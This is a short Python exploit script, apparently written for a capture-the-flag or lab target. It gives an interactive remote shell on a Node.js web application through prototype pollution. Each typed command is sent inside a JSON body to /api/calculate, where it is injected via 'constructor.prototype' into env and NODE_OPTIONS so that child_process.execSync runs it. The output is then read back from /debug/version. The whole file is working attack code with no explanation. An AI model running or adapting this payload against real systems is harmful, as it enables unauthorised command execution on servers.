import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--rhost', action='store', required=True)
parser.add_argument('--rport', action='store', required=True)
host = parser.parse_args()

command = "id"
while command != "exit":

    command = input("> ")
    payload = {"constructor":{"prototype": {"env": {"rce": "console.log(require(\"child_process\").execSync(\"" + command + "\").toString())//"},"NODE_OPTIONS": "--require /proc/self/environ"}}}
    requests.post(f'http://{host.rhost}:{host.rport}/api/calculate', json=payload)
    
    r = requests.get(f'http://{host.rhost}:{host.rport}/debug/version')
    
    print(r.text)
